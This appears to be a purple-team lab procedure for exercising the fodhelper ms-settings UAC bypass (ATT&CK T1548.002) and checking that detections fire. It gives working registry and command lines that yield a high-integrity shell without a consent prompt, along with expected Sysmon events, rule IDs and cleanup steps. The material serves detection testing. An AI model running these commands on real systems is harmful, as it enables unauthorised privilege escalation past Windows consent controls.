# SC-11 — UAC bypass (evasion procedure)

**ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User
Account Control)

## Objective

Execute the fodhelper `ms-settings` hijack through the framework shell
and watch the full chain light up: registry writes → auto-elevate →
high-integrity child without a consent dialog. Playbook:
`detections/playbooks/T1548.002-uac-bypass.md`.

## Prerequisites

- Interactive shell; the shell's user is in the local Administrators
  group **but the shell is non-elevated** (the agent inherits the
  launch context — ssh gives a filtered token, which is exactly what
  the bypass abuses).

## Procedure (operator console)

```
interact <session-prefix>
shell
whoami /groups | findstr "S-1-16"
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd /c whoami /groups > C:\\labs\uac.txt" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
fodhelper.exe
timeout /t 3 >nul
type C:\\labs\uac.txt
back
```

- `whoami /groups | findstr "S-1-16"` shows the filtered
  Mandatory Label before and the high-integrity label inside
  `uac.txt` after — the elevation jump, quantified.

## Expected host artifacts

- EID 13: both `ms-settings\Shell\Open\command` writes (lab config
  includes the ms-settings keys).
- EID 1: `fodhelper.exe` spawned by the agent shell; the elevated
  `cmd.exe` child with `fodhelper.exe` as parent (a lineage no consent
  flow ever produces).
- EID 11: `uac.txt` landing.

## Expected detections

- `9e938f81-591b-4a41-bbef-a6023ff333ab` (uac-bypass-fodhelper).
- `90120763-6b76-4850-aedf-a6a2d57e7d28` (agent-spawns-shell).
- `c3b6008a`-style registry hunting transfers directly (same rule
  family, different key).

## Cleanup

```
reg delete "HKCU\Software\Classes\ms-settings" /f
del C:\\labs\uac.txt
```

## Coverage-report row

```
SC-11 | UAC bypass | T1548.002 | exercised | detections: <what fired>
```
